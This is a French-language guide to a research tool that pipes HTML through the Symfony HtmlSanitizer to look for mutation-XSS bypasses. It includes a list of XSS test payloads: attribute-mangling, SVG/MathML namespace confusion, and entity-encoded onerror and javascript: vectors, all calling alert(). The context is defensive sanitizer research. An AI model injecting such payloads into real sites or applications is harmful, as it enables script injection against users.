# 🧪 MXSS HtmlSanitizer Symphony - Guide d'utilisation

## 📋 Vue d'ensemble

Ce projet est un fork de [Dom-Explorer](https://github.com/yeswehack/Dom-Explorer) avec une intégration personnalisée du **Symfony HtmlSanitizer**. Il permet de tester des payloads HTML contre le sanitizer Symfony pour identifier des vulnérabilités de type mutation XSS (mXSS).

### Architecture

```
┌─────────────────────────────────────────────────────────┐
│                   Frontend (Nuxt.js)                    │
│  ┌───────────────────────────────────────────────────┐  │
│  │       Dom-Explorer Pipeline Interface             │  │
│  │  ┌─────────────────────────────────────────────┐  │  │
│  │  │  SymphonyHtmlSanitizer Vue Component       │  │  │
│  │  │  (app/components/DomExplorer/Pipes/)       │  │  │
│  │  └──────────────────┬──────────────────────────┘  │  │
│  └─────────────────────┼─────────────────────────────┘  │
└────────────────────────┼────────────────────────────────┘
                         │ HTTP POST (localhost:5000)
                         ▼
┌─────────────────────────────────────────────────────────┐
│              Backend PHP (Symfony)                      │
│  ┌───────────────────────────────────────────────────┐  │
│  │  sanitize.php                                     │  │
│  │  - Reçoit HTML via JSON POST                      │  │
│  │  - Applique Symfony HtmlSanitizer (v7.3)          │  │
│  │  - Configuration GLPI (production-like)           │  │
│  │  - Retourne HTML sanitizé                         │  │
│  └───────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────┘
```

---

## 🚀 Installation & Setup

### Prérequis

- **Bun** (package manager)
- **PHP 8.1+** avec Composer
- **Port 3000** (frontend) et **5000** (backend) disponibles

### 1. Installation du Frontend

```bash
cd ~/Documents/MXSS_HtmlSanitizer_Symphony

# Installer les dépendances
bun install

# Lancer le serveur de développement
bun run dev
```

**Accès:** http://localhost:3000

### 2. Installation du Backend PHP

```bash
cd ~/Documents/MXSS_HtmlSanitizer_Symphony/backend

# Installer Symfony HtmlSanitizer
composer install

# Lancer le serveur PHP (port 5000)
php -S 127.0.0.1:5000
```

**Endpoint:** http://127.0.0.1:5000/sanitize.php

---

## 🔧 Configuration du Sanitizer

Le fichier `backend/sanitize.php` contient la configuration Symfony HtmlSanitizer, basée sur une **config GLPI production**.

### Configuration actuelle

**Éléments autorisés:**
```php
->allowSafeElements()  // Tags HTML sûrs
->allowAttribute('class', '*')
->allowAttribute('style', '*')
->allowElement('iframe')->dropAttribute('srcdoc', '*')
```

**Éléments bloqués** (tag supprimé, contenu préservé):
```php
'html', 'body', 'form', 'button', 'input',
'select', 'textarea', etc.
```

**Éléments droppés** (tag + contenu supprimés):
```php
'head', 'script', 'link', 'meta',
'applet', 'canvas', 'embed', 'object'
```

**Schémas de liens autorisés:**
```php
'http', 'https', 'mailto', 'tel', 'ftp',
'ssh', 'notes', etc.
```

### Modifier la configuration

Pour tester différentes configurations, édite `backend/sanitize.php`:

```php
// Exemple: autoriser SVG (pour tester foreign content mXSS)
$config = $config->allowElement('svg')
                 ->allowElement('foreignObject');

// Exemple: autoriser data-* attributes (pour injection)
$config = $config->allowAttribute('data-*', 'div');
```

**⚠️ Important:** Redémarre le serveur PHP après modification.

---

## 🧪 Utilisation pour tester des mXSS

### 1. Accéder à l'interface

1. Ouvre http://localhost:3000
2. Dans l'interface Dom-Explorer, ajoute un **pipe "SymphonyHtmlSanitizer"**

### 2. Créer un pipeline de test

**Pipeline recommandé pour mXSS:**

```
Input HTML → DomParser → SymphonyHtmlSanitizer → DomParser → RenderHTML
```

**Pourquoi ce pipeline ?**
- **1er DomParser:** Montre le parsing initial du navigateur
- **SymphonyHtmlSanitizer:** Applique le sanitizer Symfony
- **2ème DomParser:** Re-parse le HTML sanitizé (détecte les mutations)
- **RenderHTML:** Visualise le résultat final

### 3. Tester des payloads

**Payloads d'exemple fournis** (fichier `payloads`):

```html
<!-- Payload 1: Attribute mangling -->
<div="test" s="<img>>"</div><img"img src=x"on"error="</div>&lt;img src=x onerror=alert() /><image>

<!-- Payload 2: Quote confusion -->
<div="test" s="<img>>"</div><img src=x"on"error="</div><img src=o"onerror=alert() /><image></image>
```

**Autres vecteurs à tester:**

```html
<!-- Foreign content context (SVG) -->
<svg><style><title><!--</title><script>alert(1)</script>--></svg>

<!-- Template element mutation -->
<template><img src=x onerror=alert(1)></template>

<!-- Namespace confusion -->
<math><mi><!--</mi><script>alert(1)</script>--></math>

<!-- Entity encoding tricks -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">

<!-- Attribute injection -->
<div style="color:red" onload="alert(1)">test</div>
```

### 4. Analyser les résultats

**Cherche des signes de mXSS:**

✅ **Bypass réussi si:**
- Le HTML sanitizé contient du JavaScript exécutable
- Des attributs `on*` (onclick, onerror) survivent
- Des balises `<script>` apparaissent après re-parsing
- Des contextes dangereux (SVG, iframe) sont injectés

❌ **Sanitization correcte si:**
- Tous les handlers d'événements sont supprimés
- Les balises dangereuses sont bloquées/échappées
- Le HTML final est identique au HTML sanitizé

---

## 📁 Structure du projet

```
MXSS_HtmlSanitizer_Symphony/
├── app/
│   └── components/
│       └── DomExplorer/
│           └── Pipes/
│               └── SymphonyHtmlSanitizer/
│                   ├── SymphonyHtmlSanitizer.pipe.ts    # Définition du pipe
│                   └── SymphonyHtmlSanitizer.vue        # Component Vue (UI + API call)
├── backend/
│   ├── composer.json                                    # Dépendance Symfony
│   ├── sanitize.php                                     # API endpoint (POST /sanitize.php)
│   └── vendor/                                          # Symfony HtmlSanitizer
├── payloads                                             # Exemples de payloads mXSS
├── package.json                                         # Dépendances frontend
└── README.md                                            # Doc originale Dom-Explorer
```

### Fichiers clés

#### `app/components/DomExplorer/Pipes/SymphonyHtmlSanitizer/SymphonyHtmlSanitizer.vue`

**Fonction principale:**
```javascript
const sanitize = useSandbox(
  async (imp, input: string) => {
    const f = await fetch("http://127.0.0.1:5000/sanitize.php", {
      method: 'POST',
      body: JSON.stringify({ html: input }),
    });
    const res = await f.json();
    return res.html;
  }
);
```

- Envoie le HTML brut au backend PHP
- Reçoit le HTML sanitizé
- Met à jour le pipeline en temps réel

#### `backend/sanitize.php`

**API REST endpoint:**
- **Method:** POST
- **Content-Type:** application/json
- **Body:** `{ "html": "<your-payload>" }`
- **Response:** `{ "html": "<sanitized-output>" }`

**Configuration:**
- Basée sur GLPI production (cas d'usage réel)
- Permet `class` et `style` (vecteur potentiel)
- Autorise `iframe` sans `srcdoc` (intéressant pour tests)

---

## 🎯 Workflow de recherche mXSS

### Phase 1: Reconnaissance

1. **Tester les éléments autorisés**
   ```html
   <div>test</div>
   <span>test</span>
   <iframe src="about:blank"></iframe>
   ```

2. **Tester les attributs autorisés**
   ```html
   <div class="foo">test</div>
   <div style="color:red">test</div>
   <span contenteditable="true">test</span>
   ```

3. **Identifier les contextes spéciaux**
   ```html
   <svg>...</svg>
   <math>...</math>
   <template>...</template>
   ```

### Phase 2: Fuzzing ciblé

1. **Foreign content transitions**
   ```html
   <svg><foreignObject><div><img src=x onerror=alert(1)></div></foreignObject></svg>
   ```

2. **Attribute mangling**
   ```html
   <div class="x" style="y" foo="<img src=x>"></div>
   ```

3. **Entity encoding**
   ```html
   <img src="&#x6a;avascript:alert(1)">
   ```

4. **Template activation**
   ```html
   <template><img src=x onerror=alert(1)></template>
   <div></div>
   ```

### Phase 3: Documentation des bypasses

Pour chaque bypass trouvé, documente:

```markdown
## Bypass #X: [Nom descriptif]

**Payload:**
\`\`\`html
[payload exact]
\`\`\`

**Contexte:**
- Configuration: [details config sanitizer]
- Navigateur: Chrome/Firefox/Safari X.X

**Résultat:**
- HTML sanitizé: [output du sanitizer]
- HTML final (après re-parsing): [DOM final]
- JavaScript exécuté: [oui/non]

**Explication:**
[Pourquoi le bypass fonctionne - transition de contexte, encoding, etc.]

**Fix recommandé:**
[Comment corriger la vulnérabilité]
```

---

## 🛠️ Debugging

### Problème: Backend PHP ne répond pas

**Vérifier que le serveur PHP tourne:**
```bash
ps aux | grep php
# Si absent, relancer:
cd ~/Documents/MXSS_HtmlSanitizer_Symphony/backend
php -S 127.0.0.1:5000
```

**Tester l'endpoint manuellement:**
```bash
curl -X POST http://127.0.0.1:5000/sanitize.php \
  -H "Content-Type: application/json" \
  -d '{"html":"<script>alert(1)</script>"}'
```

**Réponse attendue:**
```json
{"html":""}
```

### Problème: CORS errors

Si tu vois des erreurs CORS dans la console navigateur:

**Vérifier les headers dans `sanitize.php`:**
```php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST");
```

### Problème: Composer dependencies manquantes

```bash
cd backend
composer install
# Si erreur de version PHP:
composer install --ignore-platform-reqs
```

---

## 📊 Métriques de succès

**Objectifs pour la phase 1.1:**

- [ ] Identifier au moins **3 bypasses** du sanitizer Symfony
- [ ] Documenter les **edge cases HTML5** exploitables (foreign content, templates)
- [ ] Créer un **corpus de 50+ payloads** testés
- [ ] Comparer avec d'autres sanitizers (DomPurify, Bleach)

---

## 🔗 Ressources

### Documentation Symfony HtmlSanitizer
- [GitHub](https://github.com/symfony/html-sanitizer)
- [Docs officielles](https://symfony.com/doc/current/html_sanitizer.html)

### Specs HTML5
- [WHATWG HTML5 Parsing](https://html.spec.whatwg.org/multipage/parsing.html)
- [Foreign content](https://html.spec.whatwg.org/multipage/parsing.html#parsing-main-inforeign)

### Papers mXSS
- [Mario Heiderich - mXSS Attacks](https://cure53.de/fp170.pdf)
- [Google Security Research](https://research.google/pubs/pub42934/)

---

## 🎓 Prochaines étapes

Après avoir maîtrisé le projet actuel:

1. **Ajouter d'autres sanitizers** au pipeline (DomPurify, Bleach, etc.)
2. **Automatiser les tests** avec Playwright
3. **Créer un fuzzer** basé sur Domato pour génération de payloads
4. **Comparer les navigateurs** (Chrome vs Firefox vs Safari parsing)

---

**Version:** 1.0
**Dernière mise à jour:** 2026-02-12
**Auteur:** kbtch_
